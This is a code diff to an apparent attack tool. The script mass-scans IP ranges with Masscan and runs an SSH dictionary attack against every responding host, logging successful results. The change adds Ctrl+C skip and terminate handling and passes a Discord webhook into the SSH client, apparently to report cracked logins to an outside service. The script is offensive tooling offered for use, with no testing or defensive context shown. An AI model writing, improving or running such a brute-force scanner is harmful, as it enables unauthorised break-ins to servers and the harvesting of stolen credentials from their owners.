@@ -1,5 +1,7 @@
 import argparse
 import datetime
+import signal
+import sys
 from scanner.masscan import Masscan
 from _ssh.ssh_client import SSH_Client
 
@@ -57,6 +59,23 @@ if "__main__" == __name__:
 
     args = parser.parse_args()
 
+    # Flag for Ctrl+C
+    skip_loop = False
+    terminate = False
+
+    def signal_handler(sig, frame):
+        global skip_loop, terminate
+        # 2nd time
+        if skip_loop:
+            print("Will be terminating in next process.")
+            terminate = True
+            return
+
+        print("Skipping current process...")
+        skip_loop = True
+
+    signal.signal(signal.SIGINT, signal_handler)
+
     timestamp = datetime.datetime.now().isoformat()
 
     targets = []
@@ -67,6 +86,10 @@ if "__main__" == __name__:
             targets.append(_d)
 
     for target in targets:
+        if terminate:
+            print("Terminating program...")
+            sys.exit(0)
+
         print(f"Masscanning {target["ip"]}:{target["port"]}")
         ips = Masscan.scan(target["ip"], target["port"], args.max_rate)
 
@@ -75,7 +98,12 @@ if "__main__" == __name__:
             continue
 
         for i in ips:
-            ssh_client = SSH_Client(i["ip"], target["port"], args.error_verbose)
+            if skip_loop:
+                break
+
+            ssh_client = SSH_Client(
+                i["ip"], target["port"], args.error_verbose, args.discord_webhook
+            )
             ssh_client.dictionary_attack(
                 is_combo_enabled=args.disable_combo,
                 is_user_pass_enabled=args.disable_user_pass,
@@ -88,3 +116,6 @@ if "__main__" == __name__:
                         file.write(ssh_client.result + "\n")
 
             print(f"Done: {i}:{target["port"]}")
+
+        if skip_loop:
+            skip_loop = False
